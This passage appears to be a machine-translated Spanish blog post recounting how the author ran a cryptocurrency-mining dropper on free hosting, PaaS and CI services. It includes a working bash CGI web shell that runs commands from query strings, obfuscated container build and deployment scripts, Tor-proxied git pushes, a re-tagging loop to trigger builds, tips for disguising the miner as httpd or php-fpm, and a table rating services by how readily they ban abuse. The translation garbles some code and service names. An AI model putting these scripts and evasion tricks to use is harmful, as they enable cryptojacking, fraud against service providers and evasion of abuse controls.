uso del host, lo que significa que<em> deberían</em> quédate dentro de [AUP]. No hay pasos adicionales cuando se trata de implementaciones autohospedadas, solo el script de inicio, tal vez agregado a la secuencia de inicio o iniciado manualmente.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> Alojamiento web basado en cPanel</a></h3><p>Los planes de suscripción de alojamiento web se ofrecen principalmente a través de [cPanel]. Nuevamente aquí estamos usando planes de suscripción personales que tienen límites de recursos razonables, por otro lado, cualquier plan gratuito tiene límites ridículos.<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel le permite definir controladores para diferentes extensiones de archivo, esto nos permite ejecutar scripts de shell a través del<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> con una solicitud http contra un script de shell cargado en el servidor. Este tipo de interfaces son el aspecto de los shells web<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Un shell web bash simple<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Es mejor confiar solo en las funciones incorporadas, ya que es posible que no se permitan bifurcar procesos adicionales en las cárceles web, pero siempre es posible<code>exec</code> lo que nos permite utilizar la mayoría de las utilidades de la línea de comandos. La mayoría de los shells web están escritos en otros lenguajes de scripting como python o php, ya que no tiene que preocuparse por la bifurcación.<p>En un entorno de cpanel, es mejor usar un nombre estático para el proceso minero, como<code>httpd</code> o<code>php-fpm</code> porque<code>cgi</code> se basa en el procesamiento múltiple, por lo que los servidores siempre están llenos de muchos procesos denominados así, aunque un observador atento debería notar la<em> multiproceso</em> patrón de uso que definitivamente no es común (o posible) para lenguajes como perl, php, ruby ​​o python!<p>Los procesos también tienen un límite de tiempo por defecto, (1 hora, 1 día, etc.), para esto solo usamos un trabajo cron que reinicia el cuentagotas.<p>Esto requirió mucha edición manual, la API de cpanel para automatizar esto desafortunadamente no está expuesta a los usuarios finales, por lo que el alojamiento web es un objetivo torpe y aburrido para nuestro cuentagotas minero.<h3 id=web_environments><a class=header-anchor href=#web_environments> Entornos web</a></h3><p>Existen<em> SaaS</em> proveedores que tienen un editor web junto con un contenedor, como<a href="with a free tier before getting acquired by amazon"> nube9</a> , [codificar en cualquier lugar], [codenvy]. Implementar el cuentagotas aquí es fácil (tiene un entorno completo), pero mantenerlo en funcionamiento es una carga, ya que cualquier editor web interactivo finaliza su sesión poco después de que se cierra la página web y, en consecuencia, el contenedor se pone en suspensión (a menos que usted pagar por supuesto).<p>Eludir esto solo puede significar que tenemos que mantener las sesiones abiertas, algunas secuencias de comandos con [titiritero] lograron el resultado deseado, pero tener páginas web de SPA infladas y con pérdidas de memoria de larga duración es definitivamente poco atractivo y no sigiloso, porque desde el backend del proveedor, una sesión abierta las 24 horas del día, los 7 días de la semana, definitivamente parecerá sospechosa. De hecho, los entornos web también son objetivos torpes y aburridos.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Servicios de aplicaciones gratis</a></h3><p>Esto es principalmente<a href="when it used to have a free tier"> openhift</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> y [heroku]. Openshift, ser kubernetes fue algo sencillo de implementar, pero lleno de cambios de configuración, aquí hay un extracto:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(<span class=hljs-built_in>cat</span> vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(<span class=hljs-built_in>cat</span><span class=hljs-variable>$launcher</span> | <span class=hljs-built_in>tail</span> +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
<span class=hljs-built_in>cat</span> <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
<span class=hljs-built_in>cat</span> <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
<span class=hljs-built_in>chmod</span> +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Este fue el script utilizado para construir el contenedor de minería que requería una plantilla yaml:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>¡Pero todo el proceso involucró bastantes pasos!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span><span class=hljs-built_in>mv</span><span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(<span class=hljs-built_in>date</span> +%s)}</code></pre><p>En pseudocódigo:<ul><li><p>crea el proyecto<li><p>crea la aplicación sin una imagen<li><p>construye el contenedor minero<li><p>implementar el contenedor con una configuración de implementación (abstracción de kubernetes)<li><p>implementar la implementación</ul><p>los<code>build-build</code> en su lugar, los scripts crearon un<em> construir</em>contenedor que minaría durante unas pocas horas a la vez. Las compilaciones y los pods normales tienen recursos separados en openshift, por lo que los aprovechamos para ambos. Openshift fue en general una mala experiencia, ya que pasó por 4 versiones diferentes (tal vez más, dejé de rastrear después de un tiempo) y cada una de ellas requirió cambios en las configuraciones, no tenían rutas de actualización y todo se repitió rápidamente, y era común. para que las compilaciones / pods se detuvieran y no se recolectaran basura ... generalmente ejecutaban reinicios manuales de vez en cuando, tal vez Kubernetes solo tenía errores :)<p>La configuración de Heroku fue un poco más simple (no involucra kubernetes). Aparte de la construcción del contenedor, que era similar a la de openshift, el resto eran solo dos comandos cli<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>El contenedor se envió directamente con la ventana acoplable al registro de heroku.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> La fricción con heroku (cuyo nivel gratuito todavía está en pie hasta el momento de escribir este artículo) es que los dynos solo pueden ejecutarse durante 22 días al mes, por lo que requieren una administración manual cada mes, nuevamente torpe y aburrido. Ejecutaron algunas oleadas de prohibición al principio, y luego deshabilitaron los registros a través de TOR, estoy bastante seguro de que yo fui la causa de esto.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> Contenedores de CI o VM</a></h3><p>Estos fueron los objetivos más sinérgicos para nuestro cuentagotas. Hay muchos<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> empresas, muchas de las cuales están gastando dinero a los inversores ofreciendo niveles gratuitos con la esperanza de obtener una participación de mercado en el negocio de la infraestructura tecnológica.<p>Todos estos servicios ofrecen diferentes recursos, tienen diferentes requisitos de configuración y se ejecutan en diferentes entornos. Nunca consideré automatizar el registro de cuenta porque ese tipo de cosas son terribles de programar, trato de evitarlas todo el tiempo, así que soporté los registros manuales por un tiempo porque tenía curiosidad por saber qué tipo de respuesta anti-spam obtendría (y ¡Qué diferente del resto!). Puede adivinar algunas cosas sobre la administración de una empresa por cómo maneja el spam:<ul><li><p>¿Realiza ondas de prohibición? Luego tienen políticas no estrictas, los problemas se manejan manualmente y caso por caso<li><p>¿Requiere verificación por teléfono? Ya fueron abusados ​​en el pasado<li><p>¿Responden al uso intensivo de recursos? Funcionan con un presupuesto ajustado<li><p>¿Aplican restricciones de cuenta o prohibiciones ocultas? Si hacen sombra a la prohibición, tienen administradores de sistemas malos.</ul><p>También hay una pregunta filosófica: si un servicio le permite abusar de su sistema durante mucho tiempo, ¿significa que tienen una infraestructura de primera clase capaz de manejar la carga, o simplemente un control deficiente sobre su sistema? Y debe considerar el equilibrio entre accesibilidad y seguridad, un sistema demasiado seguro puede reducir la retención de usuarios.<p>Aquí hay una tabla que muestra algunos servicios en los que implementé:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>configuración<th style=text-align:center>rendimiento<th style=text-align:center>prohibición-martillo<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>malo<td style=color:#ff0;text-align:center>medio<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>Travis<td style=color:green;text-align:center>bien<td style=color:#ff0;text-align:center>medio<td style=color:green;text-align:center>bien<tr><td style=text-align:center>Codificación<td style=color:#ff0;text-align:center>medio<td style=color:red;text-align:center>malo<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>medio<td style=color:green;text-align:center>bien<td style=color:green;text-align:center>bien<tr><td style=text-align:center>Circleci<td style=color:red;text-align:center>malo<td style=color:green;text-align:center>bien<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>Semáforo<td style=color:green;text-align:center>bien<td style=color:green;text-align:center>bien<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>Estibador<td style=color:#ff0;text-align:center>medio<td style=color:#ff0;text-align:center>medio<td style=color:green;text-align:center>bien<tr><td style=text-align:center>Muelle<td style=color:green;text-align:center>bien<td style=color:#ff0;text-align:center>medio<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>Codefresh<td style=color:red;text-align:center>malo<td style=color:green;text-align:center>bien<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>medio<td style=color:#ff0;text-align:center>medio<td style=color:red;text-align:center>malo<tr><td style=text-align:center>Azure-pipelines<td style=color:#ff0;text-align:center>medio<td style=color:#ff0;text-align:center>medio<td style=color:red;text-align:center>malo<tr><td style=text-align:center>Continuousphp<td style=color:red;text-align:center>malo<td style=color:#ff0;text-align:center>medio<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>compañero<td style=color:red;text-align:center>malo<td style=color:red;text-align:center>malo<td style=color:red;text-align:center>malo<tr><td style=text-align:center>Zumbido<td style=color:red;text-align:center>malo<td style=color:green;text-align:center>bien<td style=color:red;text-align:center>malo<tr><td style=text-align:center>Appveyor<td style=color:red;text-align:center>malo<td style=color:#ff0;text-align:center>medio<td style=color:red;text-align:center>malo<tr><td style=text-align:center>Nevercode<td style=color:red;text-align:center>malo<td style=color:green;text-align:center>bien<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>Zeist / vercel<td style=color:red;text-align:center>malo<td style=color:green;text-align:center>bien<td style=color:red;text-align:center>malo</table><p>En este contexto, un<span style=color:green> bien</span> configuración significa que no tomó mucho tiempo configurar un<code>ci</code> trabajo para el proceso de minería (como todos los servicios que se basan en un panel web en lugar de un archivo de puntos de repositorio eran una tarea), un<span style=color:red> malo</span><code>ban-hammer</code> significa que fue difícil registrarse en el servicio o que las cuentas serían prohibidas de manera más agresiva.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Bitrise</a> requiere configurar un proyecto, inferir el entorno, la arquitectura de destino, el proceso de ejecución y otras cosas, fue muy lento configurar una compilación, por lo que obtuvo una mala calificación en la configuración.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> Continuousphp</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> compañero</a> , [Codefresh] también tenía muchos pasos de configuración manuales no declarativos.<p>Servicios como [Azure-pipelines],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> compañero</a> aplica shadow-bans en las cuentas, shadow-bans son malas, ya que te dejan adivinando si hay algo mal con tu configuración o no. Con algunos servicios puedes adivinar el motivo de la prohibición (prácticamente tu compilación tomó demasiado tiempo, o lo hiciste muchas veces en un período corto), para otros como [Azure-pipelines] supongo que aplicaron algún tipo de huella digital a los repositorios de usuarios a medida que se producían prohibiciones incluso sin ningún abuso de recursos, azure y vercel también restringían<code>DNS</code> acceso dentro de las máquinas de construcción pública, por lo que era una fricción adicional que debía superarse con un túnel ad-hoc.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> Zumbido</a> dio acceso a un procesador completo de más de 16 núcleos, pero terminó prohibiendo después de 2 compilaciones<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Codificación</a> también brinda acceso a potentes hosts de compilación y no prohibió de manera tan agresiva como los drones.<p>Mis servicios favoritos no por rentabilidad sino por facilidad y conveniencia (también con otros proyectos) fueron<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> Travis</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Semáforo</a> y<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Docker-hub</a>. Travis es como el CI estándar y es muy flexible, Semaphore es el único<code>DSL</code> por<code>CI</code> eso parecía accesible y bueno, en lugar de solo una secuencia interminable de casillas de verificación espaguetizadas como otras interfaces de usuario, y Docker solo por la simplicidad de mapear archivos docker a compilaciones.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Construye configuraciones</a></h3><p>Las compilaciones fueron activadas por trabajos cron ofrecidos por servicios web o por git commits. Por lo tanto, tenía que realizar un seguimiento de una gran cantidad de tokens de acceso o claves ssh para administrar todas las confirmaciones de git. También era importante no enviar demasiado spam a las confirmaciones y usar proxies al enviar a los repositorios que configuran git:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Al usar los servicios de alojamiento de git, github ha sido el más completo sobre las prohibiciones, pero solo se ejecutaron tras los informes de abuso por parte de los administradores de servicios de ci, gitlab ejecutó una ola de prohibición una vez, cuando intenté renovar la prueba de CI (descuidadamente). Nunca he recibido una prohibición para una cuenta de bitbucket. Para (forzar) empujar las confirmaciones de git, tenemos un ciclo de larga ejecución que vuelve a etiquetar el repositorio de git:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(<span class=hljs-built_in>ls</span> -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span><span class=hljs-built_in>sleep</span><span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span><span class=hljs-built_in>sleep</span> 1
<span class=hljs-keyword>done</span></code></pre><p>Es posible que forzar el empuje de esta manera no sea algo que le guste mucho a github y podría haber sido una causa para que las cuentas se marcaran. La función del etiquetador, que tiene la tarea de forzar el empuje de diferentes confirmaciones, utiliza un sitio web (que puede buscar con bastante facilidad) que proporciona algunas confirmaciones aleatorias. No estoy seguro de cuánto ayuda esto, ya que el contenido en sí de las confirmaciones es obviamente sospechoso para mi caso. Y también me mordió el trasero una vez, ya que las confirmaciones devueltas por este comando pueden incluir malas palabras, ¡una de mis confirmaciones fue recogida por un bot de Twitter que rastrea las confirmaciones de git con malas palabras! Agregué una lista negra de malas palabras después del incidente.<p>Realmente no he profundizado en las confirmaciones de git ofuscadas y los repositorios de git ofuscados. La única instancia en la que estaba usando un repositorio más elaborado fue con Bitrise, ya que no se podía configurar una compilación si el sistema no reconocía un entorno (como las aplicaciones móviles), pero incluso entonces no había ninguna rotación y siempre era lo mismo. repositorio, bastante fácil de detectar.<p>En general, si tuviera que trazar una curva de campana alrededor del tiempo óptimo para la mía<em> sin</em>prohibir las cuentas, en todos los servicios probados, sería con un centro de alrededor de 1 hora de duración de la compilación, una vez al día. Para los núcleos de cpu, aparte de un par de mentirosos (como drones), la mayoría de los servicios esperan que use la cantidad total de recursos que se le brindan, ya que las compilaciones se ejecutan dentro de máquinas virtuales o contenedores con recursos limitados ... y la compilación suele ser una tarea que satura la CPU, por lo que no tiene relevancia estadística. Intuitivamente, una compilación por día es lo que haría el desarrollador promedio, por lo que debe esperar que se levanten banderas si se aleja de la media, y presionar por el abuso nunca termina bien.<h2 id=conclusions><a class=header-anchor href=#conclusions> Conclusiones</a></h2><p>¿Valió la pena? Las partes de la red fueron definitivamente interesantes, lidiar con los registros de cuentas fue obviamente la peor parte, a nadie le gusta hacer clic en correos electrónicos de confirmación interminables y repetir procedimientos de interfaz de usuario que adormecen la mente, después de todo. Escribir software de automatización de spam también es aburrido (porque en su mayoría estás metiendo en API tontas), y con esta suposición (y el hecho de que esto nunca fue nada serio) ni siquiera lo consideré. ¿Fue rentable? En su apogeo estaba alcanzando algo así como<code>300$</code> al mes, tal vez suficiente para un venezolano, no realmente para mí :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> el administrador de sistemas gruñón</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>A pesar de que esto rompería muchas suposiciones de privacidad, estoy seguro de que la mayoría de ellos simplemente se asoman cuando hay un problema, pero esto es solo un problema para los tiempos de ejecución basados ​​en contenedores, mientras que las máquinas virtuales son prácticamente cajas negras.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>el minero integrado en el nodo monero consiguió algo de trabajo para hacerlo más compatible con el fondo, pero la distribución de xmrig nunca se centró en la compatibilidad con el fondo.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>algunos grupos ofrecen diferentes dificultades en diferentes puertos de conexión y tienden a alinear la dificultad del trabajo con los recursos compartidos enviados por el minero, pero la granularidad del proxy era aún más conveniente, ya que evitaría el grupo<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> cerrar</a> (aunque nunca cambiamos de piscina).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>no estaba contento cuando la configuración apareció repentinamente y desapareció del sistema de archivos</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>No hablamos de la<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> protocolo de estrato</a> ya que solo tenemos que lidiar con todo lo que se implemente en<em> ambos</em> la piscina y el minero ... que suele ser lo mínimo, y posiblemente con extensiones no estándar.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>nunca vayas por completo :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>No he explorado lo que sucede cuando un proceso carga funcionalidad adicional en tiempo de ejecución, ya que el kernel buscaría la dirección en el diseño de memoria del ejecutable, lo que accedería al sistema de archivos y posiblemente causaría un bloqueo.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Los límites son arbitrarios, el tiempo de la CPU es inferior a un segundo, la memoria es inferior a 128 M, las conexiones salientes están bloqueadas.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>con un poco de paciencia, también puede ejecutar una instancia ssh completa en un entorno que se inicia en el espacio de su cuenta de cpanel,<em> sin</em> tener acceso al cpanel incorporado SSH que tiende a ser deshabilitado por los proveedores de alojamiento.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openshift pasó de un nivel gratuito de 1 año a 3 meses a 1 mes, comenzando a requerir autenticación telefónica, puedo garantizar que no fui el único que abusaba de sus servicios.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Los contenedores de nivel gratuito de Heroku son bastante generosos en recursos, proporcionan cpus de 4c / 8t (virtual), mucho RAM y gran almacenamiento (que, sin embargo, no es persistente y se descarta cuando se apaga el dinamómetro).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Agregan reglas de registro mucho más estrictas, después de un par de prohibiciones, podría haber contribuido a ello.</table><p><div id=post-tags-list>Etiquetas de publicación: <span class=post-tag><a href=https://www.unto.re/tag/crypto> cripto</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> neto</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> cascarón</a></span></div><div class=page-foot><div class=copyright>21 de agosto de 2021</div></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - Desarrollado por<a href=https://github.com/tlienart/Franklin.jl> Franklin</a></div><div class=page__footer-links>- <ul><li><a href=/es/sitemapxml> Mapa del sitio</a></li> | <li><a href=/es/tag> Etiquetas</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls 